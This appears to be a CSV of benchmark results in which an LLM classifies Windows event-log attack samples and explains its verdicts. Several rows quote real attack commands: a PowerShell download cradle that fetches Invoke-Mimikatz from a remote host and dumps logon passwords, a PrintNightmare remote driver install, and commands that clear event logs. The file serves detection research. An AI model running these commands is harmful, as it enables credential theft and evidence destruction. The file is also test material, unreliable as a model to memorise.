# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,"ID4688,6416,4648-SystemNightMare.evtx",easy,A,processed,YES,100.0,86.2,YES,"1102, 4688, 4648, 4690, 4658, 4656, 6416","net.exe, rundll32.exe, spoolsv.exe, drvinst.exe, svchost.exe, cmd.exe, conhost.exe","admmig, gentilguest, FS01$","net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", ""cmd.exe""","printnightmare.gentilkiwi.com, 20.188.56.147","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,10.96,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4690, 4658, 4656, 6416
- Processes: net.exe, rundll32.exe, spoolsv.exe, drvinst.exe, svchost.exe, cmd.exe, conhost.exe
- Accounts: admmig, gentilguest, FS01$
- Commands: net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", ""cmd.exe""
- Network: printnightmare.gentilkiwi.com, 20.188.56.147
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
This is a clear PrintNightmare (CVE-2021-1675/CVE-2021-34527) exploit: the actor mounts a remote attacker-controlled share and uses rundll32 printui.dll to install a malicious ""Kiwi Legit Printer"" driver from printnightmare.gentilkiwi.com, triggering drvinst.exe driver installs by the spooler. The Security log was cleared first (Event 1102), and the spoolsv.exe service then spawns an elevated SYSTEM cmd.exe (parent spoolsv.exe, high integrity), confirming arbitrary code execution as SYSTEM. The combination of log clearing, remote driver injection, and spooler-spawned SYSTEM shell is unambiguously malicious."
claude-opus-4-8,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,75.0,YES,"4624, 4674, 4688","cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C ""...Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'...DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1')..."", C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""","10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/","\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",33.3,39.60,4.5,6.0,2.7,4,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 4674, 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd
- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C ""...Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'...DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1')..."", C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
- Network: 10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/
- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB

EXPLANATION:
A remote NTLM logon (including an ANONYMOUS LOGON) from 10.23.123.11 by admmig is followed by an obfuscated PowerShell one-liner that disables SSL validation, downloads Invoke-Mimikatz.ps1 from a remote host, and runs sekurlsa::logonpasswords to dump credentials, then POSTs results back. The encoded/obfuscated command, credential-theft tooling, remote payload retrieval, and subsequent SYSTEM-level shell.cmd execution constitute clear attacker behavior consistent with lateral movement and credential dumping."
claude-opus-4-8,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101...'.sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", powershell.exe  -exec bypass -noni -nop -w 1 -C ""...""","10.23.123.11:443, https://10.23.123.11:443/Invoke-Mimikatz.ps1",,16.7,8.36,4.5,6.0,3.3,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101...'.sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", powershell.exe  -exec bypass -noni -nop -w 1 -C ""...""
- Network: 10.23.123.11:443, https://10.23.123.11:443/Invoke-Mimikatz.ps1
- Registry: None

EXPLANATION:
WmiPrvSE.exe spawned cmd.exe which launched an obfuscated PowerShell command using execution bypass, no-profile, hidden window, and a heavily encoded character-array/split payload reassembled at runtime — classic encoded payload evasion. The decoded content downloads Invoke-Mimikatz.ps1 from 10.23.123.11:443 to run credential theft (privilege::debug, sekurlsa::logonpasswords), confirming a malicious WMI lateral-movement and credential-dumping chain at High integrity."
claude-opus-4-8,ID400-800-CrackMapExec payload execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"600, 400, 800, 403",powershell.exe,OFFSEC\admmig,powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X') | Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit',"https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/",,0.0,8.07,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 600, 400, 800, 403
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/
- Registry: None

EXPLANATION:
The PowerShell command uses obfuscated execution (-exec bypass -noni -nop, char-array decoding) to disable certificate validation and download Invoke-Mimikatz.ps1 from a remote host, then runs credential-dumping commands (sekurlsa::logonpasswords) and exfiltrates results via POST. The decoded payload was flagged ""This script contains malicious content and has been blocked by your antivirus software,"" confirming malicious intent (credential theft / Mimikatz)."
claude-opus-4-8,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,69.8,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')","https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/",,16.7,8.90,4.2,6.0,3.3,3,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/
- Registry: None

EXPLANATION:
The logs show heavily obfuscated PowerShell launched with execution-bypass flags that decodes to an AMSI-bypass routine, disables certificate validation, and downloads/executes Invoke-Mimikatz from a remote host to dump credentials (sekurlsa::logonpasswords) before exfiltrating results via an HTTP POST. The deobfuscation chain (char-array reconstruction via Set-Variable Ofs, Invoke-Expression) and the credential-theft tooling are clear attack behaviors, confirmed by the antivirus blocking the script as malicious content."
claude-opus-4-8,ID4688-Obfuscated payload transfer via service name - Tchopper.evtx,easy,B,processed,YES,100.0,75.2,YES,4688,"cmd.exe, powershell.exe, conhost.exe, WmiPrvSE.exe, dllhost.exe","FS03$, admmig","c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",,,0.0,13.13,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, WmiPrvSE.exe, dllhost.exe
- Accounts: FS03$, admmig
- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: None
- Registry: None

EXPLANATION:
The logs show hundreds of identical, machine-paced (roughly 1.4-second interval) automated iterations of cmd.exe spawning powershell.exe to enumerate services (Get-Service ""segN"") and append output to a single file tmp_payload.txt, indicating scripted reconnaissance/data staging rather than normal admin activity. The sequential ""seg1"" through ""seg244"" pattern run as SYSTEM (FS03$) is characteristic of an automated collection/enumeration tool, and a later DllHost COM process (TokenElevationType %%1938) tied to user admmig suggests follow-on interactive/elevation activity. The volume, regularity, and output-staging to a temp payload file together form a malicious automated enumeration signature."
claude-opus-4-8,ID104-1102-Event log cleared.evtx,easy,A,processed,YES,100.0,100.0,YES,"104, 1102",,,,,,0.0,3.56,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 1102
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 1102 (Security log cleared) followed by a massive burst of Event ID 104 (event log file cleared) on FS03.offsec.lan within seconds is a strong anti-forensics / log-tampering signature. The volume and rapid sequence of log-clearing events indicate deliberate evidence destruction rather than routine maintenance, consistent with an attacker covering their tracks."
claude-opus-4-8,ID4688-Clear event log attempt (native).evtx,easy,A,processed,YES,100.0,86.7,YES,4688,"C:\Windows\System32\wevtutil.exe, C:\Windows\System32\conhost.exe",admmig,"""C:\Windows\system32\wevtutil.exe""  cl RTWorkQueueTheading, ""C:\Windows\system32\wevtutil.exe""  cl Security, ""C:\Windows\system32\wevtutil.exe""  cl Setup, ""C:\Windows\system32\wevtutil.exe""  cl SmbWmiAnalytic, ""C:\Windows\system32\wevtutil.exe""  cl System, ""C:\Windows\system32\wevtutil.exe""  cl SystemEventsBroker, ""C:\Windows\system32\wevtutil.exe""  cl ""Windows PowerShell""",,,0.0,5.99,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\wevtutil.exe, C:\Windows\System32\conhost.exe
- Accounts: admmig
- Commands: ""C:\Windows\system32\wevtutil.exe""  cl RTWorkQueueTheading, ""C:\Windows\system32\wevtutil.exe""  cl Security, ""C:\Windows\system32\wevtutil.exe""  cl Setup, ""C:\Windows\system32\wevtutil.exe""  cl SmbWmiAnalytic, ""C:\Windows\system32\wevtutil.exe""  cl System, ""C:\Windows\system32\wevtutil.exe""  cl SystemEventsBroker, ""C:\Windows\system32\wevtutil.exe""  cl ""Windows PowerShell""
- Network: None
- Registry: None

EXPLANATION:
The account admmig is rapidly executing wevtutil.exe with the ""cl"" (clear-log) command against numerous event logs including Security, System, Setup, and Windows PowerShell within a single second. This systematic, automated mass clearing of event logs is a classic anti-forensic / defense-evasion technique (MITRE ATT&CK T1070.001) used to destroy evidence after an intrusion. The volume and sequence of log-clearing operations strongly indicate malicious activity rather than routine administration."
claude-opus-4-8,ID4688-Clear event log attempt (wmi).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688",C:\Windows\System32\wbem\WMIC.exe,admmig,"wmic  nteventlog where filename=""security"" cl",,,0.0,3.53,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\wbem\WMIC.exe
- Accounts: admmig
- Commands: wmic  nteventlog where filename=""security"" cl
- Network: None
- Registry: None

EXPLANATION:
The audit log was cleared (Event 1102) immediately followed by a WMIC command (Event 4688) by account admmig that clears the security event log (""nteventlog where filename='security' cl""). This sequence of clearing logs is a classic anti-forensic / defense-evasion technique used to destroy evidence of intrusion activity."
claude-opus-4-8,ID800-4103-4104-Clear event log attempt.evtx,easy,A,processed,YES,100.0,75.0,YES,"4104, 800, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"Clear-EventLog -LogName application, system -confirm",,,0.0,4.63,4.5,5.0,4.0,3,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 800, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Clear-EventLog -LogName application, system -confirm
- Network: None
- Registry: None

EXPLANATION:
The user OFFSEC\admmig executed Clear-EventLog to wipe the application and system event logs on FS03.offsec.lan, a classic anti-forensic/defense evasion technique (MITRE ATT&CK T1070.001). Clearing event logs serves to destroy evidence of prior activity and is not part of routine administration. The repeated logging of this command across PowerShell operational and classic channels confirms the log-clearing action."
claude-opus-4-8,ID4616-system time changed.evtx,easy,A,processed,YES,100.0,100.0,YES,4616,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\dllhost.exe","admmig, LOCAL SERVICE",,,,0.0,4.44,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4616
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\dllhost.exe
- Accounts: admmig, LOCAL SERVICE
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Multiple Event ID 4616 (system time change) events show the clock being altered by a non-system user account (admmig) via powershell.exe and dllhost.exe, including a large backward jump of roughly three days (PreviousTime 2021-11-27 to NewTime 2021-11-24). Manipulating system time by an interactive admin process is a known anti-forensic/timestomping technique used to disrupt log correlation and evade detection, which makes this pattern suspicious rather than routine."
claude-opus-4-8,ID4964-Login of a member of a special group.evtx,easy,A,processed,YES,100.0,100.0,YES,4964,,"admmig, LOCAL SERVICE, ROOTDC1$",,,,0.0,5.44,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4964
- Processes: None
- Accounts: admmig, LOCAL SERVICE, ROOTDC1$
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event 4964 indicates logons by accounts flagged as ""special groups,"" and the repeated tagging of admmig (S-1-5-21-...-1111) carrying the monitored SID S-1-5-21-4230534742-2542757381-3142984815-1613 across many rapid logons on a domain controller (rootdc1.offsec.lan) is consistent with privileged-credential abuse. The clustering of numerous high-privilege logon sessions in seconds for a single account on a DC suggests credential misuse or lateral movement rather than normal interactive use."
claude-opus-4-8,"ID11,13-SMBexec service registration.evtx",easy,A,processed,YES,100.0,87.5,YES,"13, 11","C:\Windows\system32\services.exe, C:\Windows\system32\cmd.exe",,%%COMSPEC%% /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | %%TEMP%%\execute.bat &amp | %%COMSPEC%% /Q /c %%TEMP%%\execute.bat &amp | del %%TEMP%%\execute.bat,127.0.0.1,"HKLM\System\CurrentControlSet\Services\BTOBTO\Start, HKLM\System\CurrentControlSet\Services\BTOBTO\ImagePath",33.3,6.10,5.2,5.0,2.7,3,15.9,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13, 11
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\cmd.exe
- Accounts: None
- Commands: %%COMSPEC%% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %%TEMP%%\execute.bat &amp; %%COMSPEC%% /Q /c %%TEMP%%\execute.bat &amp; del %%TEMP%%\execute.bat
- Network: 127.0.0.1
- Registry: HKLM\System\CurrentControlSet\Services\BTOBTO\Start, HKLM\System\CurrentControlSet\Services\BTOBTO\ImagePath

EXPLANATION:
A new service ""BTOBTO"" was created with an ImagePath executing cmd.exe to write/run/delete a batch file and redirect output to an admin share (\\127.0.0.1\C$\__output), which is the classic PsExec/Impacket remote command execution pattern. The Start value rapidly toggled (0x3 then 0x4), indicating the service was created, started, and disabled to cover tracks, and cmd.exe immediately dropped execute.bat in the Temp directory. This sequence is consistent with lateral movement/remote command execution, not routine administration."
claude-opus-4-8,"ID4624,4670,4688,4674-Registry permission change via WMI (DAMP).evtx",easy,A,processed,YES,100.0,84.6,YES,"1102, 4672, 4624, 4670, 4674, 4688, 4673, 5447","C:\Windows\System32\svchost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\System32\dllhost.exe","hack1, FS03$, LOCAL SERVICE, admmig","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",10.23.42.38,"\REGISTRY\MACHINE\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal, \REGISTRY\MACHINE\SECURITY\Policy\Secrets\NL$KM\CurrVal, \REGISTRY\MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal, \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\JD, \REGISTRY\MACHINE\SAM\SAM\DOMAINS\Account\Users\000001F4",0.0,18.17,5.1,6.0,4.0,4,19.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4672, 4624, 4670, 4674, 4688, 4673, 5447
- Processes: C:\Windows\System32\svchost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\dllhost.exe
- Accounts: hack1, FS03$, LOCAL SERVICE, admmig
- Commands: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: 10.23.42.38
- Registry: \REGISTRY\MACHINE\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal, \REGISTRY\MACHINE\SECURITY\Policy\Secrets\NL$KM\CurrVal, \REGISTRY\MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal, \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\JD, \REGISTRY\MACHINE\SAM\SAM\DOMAINS\Account\Users\000001F4

EXPLANATION:
The log opens with Event 1102 (audit log cleared) followed by a remote (LogonType 3) Kerberos logon by ""hack1"" with SeBackup/SeRestore/SeTakeOwnership/SeDebug privileges, then thousands of 4674 handle-access events from WmiPrvSE.exe systematically reading the SECURITY hive secrets (LSA JD/Skew1/GBG, $MACHINE.ACC, DPAPI_SYSTEM, NL$KM) and the SAM database. This pattern is a classic remote SAM/LSA secrets credential dump (registry hive extraction) performed over WMI, consistent with secretsdump-style attacker behavior. The combination of log clearing, privileged remote logon, and bulk access to credential-storage registry keys is clearly malicious."
